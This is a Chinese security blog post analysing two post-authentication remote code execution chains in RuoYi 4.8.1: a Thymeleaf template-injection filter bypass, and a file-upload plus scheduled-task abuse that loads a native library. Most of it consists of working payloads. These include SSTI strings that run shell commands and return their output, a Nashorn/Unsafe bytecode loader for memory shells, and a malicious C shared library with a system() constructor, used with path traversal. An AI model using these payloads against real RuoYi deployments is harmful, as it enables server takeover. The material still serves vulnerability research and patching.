title: 若依RuoYi 4.8.1 后台RCE
author: Bmth
tags: []
top_img: 'https://i-blog.csdnimg.cn/direct/bb73057049ee442a85af5479b9893a67.png'
cover: 'https://i-blog.csdnimg.cn/direct/bb73057049ee442a85af5479b9893a67.png'
categories:
  - 漏洞分析
date: 2025-11-26 18:01:00
---
不能通杀！！！略鸡肋

不过大佬的思路太强了，值得学习，膜拜Orz
![](https://i-blog.csdnimg.cn/direct/bb73057049ee442a85af5479b9893a67.png)

## 环境搭建
下载：[https://gitee.com/y_project/RuoYi](https://gitee.com/y_project/RuoYi)
我这里下载的是4.8.1

新建数据库ry，然后导入`sql/ry_20250416.sql`

修改`src/main/resources/logback.xml`的日志路径地址
修改`src/main/resources/application-druid.yml`的数据库账号密码

最后启动即可
![](https://i-blog.csdnimg.cn/direct/27bb7b5648a445808f43e58bd8097fbc.png)


## Thymeleaf模板注入
这个版本的Thymelea版本为3.0.15

该版本修复了`T ()`这样执行RCE，并且新增了检测机制containsExpression

看到`org.thymeleaf.spring5.util.SpringRequestUtils#checkViewNameNotInRequest`
![](https://i-blog.csdnimg.cn/direct/cc1c31f02af44e2c92b2623f65821b22.png)

对viewName、requestURI、paramNames都做了检测

```java
private static boolean containsExpression(String text) {
    int textLen = text.length();
    boolean expInit = false;

    for(int i = 0; i < textLen; ++i) {
        char c = text.charAt(i);
        if (!expInit) {
            if (c == '$' || c == '*' || c == '#' || c == '@' || c == '~') {
                expInit = true;
            }
        } else {
            if (c == '{') {
                return true;
            }

            if (!Character.isWhitespace(c)) {
                expInit = false;
            }
        }
    }

    return false;
}
```
检测关键字后面是否是`{`，如果是则返回true

看到后面的`if (!Character.isWhitespace(c))`，如果后面的字符不为空格，则expInit = false，又回到了第一个判断

如果我们连续使用两个`$$`，即
```
$->走if->expInit = true
$->走else->expInit = false
{->走if->绕过检测
```
但是默认不支持`$${}`这种写法

这里官方文档给了我们答案
![](https://i-blog.csdnimg.cn/direct/a4d45ed67e964b3295573ec94d639a29.png)

可以使用
```
__|$${#response.addHeader("x-cmd","n4c1")}|__
```
等价于
```
__'$' + ${#response.addHeader("x-cmd","n4c1")}__
```
![](https://i-blog.csdnimg.cn/direct/688afade98944816affbcfd9019e4fc3.png)

最后就是绕过`org.thymeleaf.spring5.util.SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam`方法

其实跟3.1.2的绕过方法一样，通过`new.`绕过

RCE：
```java
__|$${new.java.lang.ProcessBuilder('bash','-c','open -a Calculator').start()}|__
```
![](https://i-blog.csdnimg.cn/direct/cf6920ce765644b3a058ebe579d03bc0.png)


### 回显
方法一：报错回显
```java
__|$${new.java.util.Scanner(new.java.lang.ProcessBuilder("bash", "-c", "whoami").start().getInputStream(),"GBK").useDelimiter("\\A").next()}|__::.x
```
![](https://i-blog.csdnimg.cn/direct/8567649aa0654f2898aa0b1182b37c1b.png)

这里需要在后面加上`::.x`，至于为什么，X1r0z师傅有解释：[对 Thymeleaf SSTI 的一点思考](https://exp10it.io/posts/thinking-about-thymeleaf-ssti/)


方法二：header头回显
```java
__|$${#response.addHeader('x-cmd',new.java.util.Scanner(new.java.lang.ProcessBuilder("bash", "-c", "ls").start().getInputStream(),"GBK").useDelimiter("\\A").next())}|__
```
![](https://i-blog.csdnimg.cn/direct/34fbf5cbab564442a25851f3d3323496.png)

方法三：字节码加载
```java
__|$${new.javax.script.ScriptEngineManager().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator');")}|__
```
转换为通过Base64传参
```java
__|$${new.javax.script.ScriptEngineManager().getEngineByName("js").eval(new.org.apache.shiro.codec.Base64().decodeToString("amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoJ29wZW4gLWEgQ2FsY3VsYXRvcicpOw=="))}|__
```
加载字节码：
```js
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
function getUnsafe(){
  var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  theUnsafeMethod.setAccessible(true); 
  return theUnsafeMethod.get(null);
}
function removeClassCache(clazz){
  var unsafe = getUnsafe();
  var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(),null);
  var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
  unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);
}
function bypassReflectionFilter() {
  var reflectionClass;
  try {
    reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
  } catch (error) {
    reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
  }
  var unsafe = getUnsafe();
  var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
  var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
  if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  removeClassCache(java.lang.Class.forName("java.lang.Class"));
}
function setAccessible(accessibleObject){
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}
function defineClass(){
  var classBytes = "yv66vgAAA......";
  var bytes = java.util.Base64.getDecoder().decode(classBytes);
  var clz = null;
  var version = java.lang.System.getProperty("java.version");
  var unsafe = getUnsafe();
  var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
  try{
    if (version.split(".")[0] >= 11) {
      bypassReflectionFilter();
      defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
      setAccessible(defineClassMethod); 
      clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
    }else{
      var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
      clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
    }
  }catch(error){
    error.printStackTrace();
  }finally{
    return clz.newInstance();
  }
}
defineClass();
```
![](https://i-blog.csdnimg.cn/direct/0e05aee1311a4a0696643ea3d978d807.png)

编码的时候需要先Base64再URL编码，加载回显/内存马即可
![](https://i-blog.csdnimg.cn/direct/22f95d5a3e4c42d08b0574a492313962.png)


### 为什么说鸡肋
存在漏洞的代码在：[https://gitee.com/y_project/RuoYi/blob/v4.8.1/ruoyi-admin/src/main/java/com/ruoyi/web/controller/monitor/CacheController.java](https://gitee.com/y_project/RuoYi/blob/v4.8.1/ruoyi-admin/src/main/java/com/ruoyi/web/controller/monitor/CacheController.java)
![](https://i-blog.csdnimg.cn/direct/7392753bc3424e159c66dc926836ae63.png)

可以看到是3年前的代码，主要是这三个接口外加一个demo的接口：
```
/monitor/cache/getNames
/monitor/cache/getKeys
/monitor/cache/getValue
/demo/form/localrefresh/task
```
但是在：[https://gitee.com/y_project/RuoYi-Vue](https://gitee.com/y_project/RuoYi-Vue) 中
![](https://i-blog.csdnimg.cn/direct/184bcb6f0cff4f2f9b83b388bbb38c3c.png)


这四个接口都不存在Thymeleaf SSTI模板注入了

如今大部分网站都用的RuoYi-Vue，前后端分离的版本，gg


参考：
[ 某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)](https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw)
[Thymeleaf漏洞汇总](https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html)

## 计划任务&文件上传RCE
很巧妙啊

关键点在于profile：`src/main/resources/application.yml`，需要知道文件的上传路径
![](https://i-blog.csdnimg.cn/direct/6d7e3c04115646d89eca60ce851aeaad.png)

若依的后台计划任务支持Bean调用和Class类调用，主要的代码逻辑在：`com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod`

但根据版本迭代，在4.8.1版本中添加计划任务存在黑名单限制，`com.ruoyi.quartz.controller.SysJobController#addSave`
![](https://i-blog.csdnimg.cn/direct/1387c18882af4cc1a36ab4dc169bf752.png)

并且存在白名单检测：`com.ruoyi.quartz.util.ScheduleUtils#whiteList`
![](https://i-blog.csdnimg.cn/direct/870becfcb0544e468af68a4115ff1bae.png)

白名单字符串为：`com.ruoyi.quartz.task`
如果invokeTarget中包含白名单字符串，则能够添加计划任务

### 文件上传
存在文件上传接口`/common/upload`
![](https://i-blog.csdnimg.cn/direct/96ef71266ad440e9a8ced192f4c02bb1.png)

可以看到上传的文件名前半部分可控
![](https://i-blog.csdnimg.cn/direct/0c6388043a7b4f03801cf8597e34b2dc.png)

那么我们可以上传一个名字包含`com.ruoyi.quartz.task`字符串的文件

### JNI RCE
在java中可以通过`com.sun.glass.utils.NativeLibLoader#loadLibrary`方法加载链接库

我们构造一个文件
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__ ((__constructor__)) void angel (void) {
    system("open -a calculator");
}
```
`gcc -arch x86_64 -shared -o 1.dylib calc.c`
然后上传文件
![](https://i-blog.csdnimg.cn/direct/26428b68933a40d793b2f7fc5320c16a.png)

这样就制造了一个白名单通道

由于我是mac系统，文件后缀必须为dylib
![](https://i-blog.csdnimg.cn/direct/b963df7bc639414c9b0a358fb74714da.png)

首先修改后缀名
```java
ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying("/Users/bmth/Web/代码审计/源码/RuoYi/RuoYi-v4.8.1/uploadPath/upload/2025/11/26/com.ruoyi.quartz.task_20251126171123A005.txt","/Users/bmth/Web/代码审计/源码/RuoYi/RuoYi-v4.8.1/uploadPath/upload/2025/11/26/com.ruoyi.quartz.task_20251126171123A005.dylib")
```
最后RCE
```java
com.sun.glass.utils.NativeLibLoader.loadLibrary('../../../../../../../../../../../Users/bmth/Web/代码审计/源码/RuoYi/RuoYi-v4.8.1/uploadPath/upload/2025/11/26/com.ruoyi.quartz.task_20251126171123A005')
```
![](https://i-blog.csdnimg.cn/direct/cad4f8c8571c44f3ba598a3c8276923c.png)


由于必须知道文件上传的绝对路径，相对比较鸡肋

默认路径：
```
Windows：D:/ruoyi/uploadPath
Linux：/home/ruoyi/uploadPath
```
参考：[ruoyi4.8后台RCE分析](https://xz.aliyun.com/news/17890)
